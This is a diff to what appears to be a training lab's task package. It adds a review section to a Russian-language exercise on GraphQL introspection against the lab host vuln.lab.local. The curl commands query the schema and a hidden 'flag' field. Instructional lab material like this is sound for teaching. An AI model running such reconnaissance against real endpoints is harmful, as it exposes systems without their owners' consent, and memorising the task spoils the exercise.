@@ -9,7 +9,7 @@
     },
     {
       "path": "/home/student/task/task.md",
-      "text": "# Практика: GraphQL introspection\n\nЦель — `http://vuln.lab.local/graphql`. Эндпоинт GraphQL открыт, и у него\nвключена интроспекция — можно спросить схему и узнать все поля.\n\n1. Спроси схему (introspection):\n\n   curl -s -G http://vuln.lab.local/graphql --data-urlencode 'query={__schema{queryType{name}}}'\n\n2. В схеме видно скрытое поле `flag`. Запроси его:\n\n   curl -s -G http://vuln.lab.local/graphql --data-urlencode 'query={flag}'\n\n3. Достань флаг (`cut -d: -f3`), запиши в `found.txt`, набери `check`.\n"
+      "text": "# Практика: GraphQL introspection\n\nЦель — `http://vuln.lab.local/graphql`. Эндпоинт GraphQL открыт, и у него\nвключена интроспекция — можно спросить схему и узнать все поля.\n\n1. Спроси схему (introspection):\n\n   curl -s -G http://vuln.lab.local/graphql --data-urlencode 'query={__schema{queryType{name}}}'\n\n2. В схеме видно скрытое поле `flag`. Запроси его:\n\n   curl -s -G http://vuln.lab.local/graphql --data-urlencode 'query={flag}'\n\n3. Достань флаг (`cut -d: -f3`), запиши в `found.txt`, набери `check`.\n\n## Повторение (`web-api-rest-graphql-soap`)\n\nGraphQL — один `POST /graphql` с телом-запросом, как в `web-api-rest-graphql-soap`. Сначала спроси саму схему (introspection), чтобы увидеть поля:\n\n    curl -s -G http://vuln.lab.local/graphql --data-urlencode 'query={__schema{queryType{name}}}'\n\nТипы из ответа подскажут, где искать скрытое поле с флагом.\n"
     }
   ],
   "tools": {
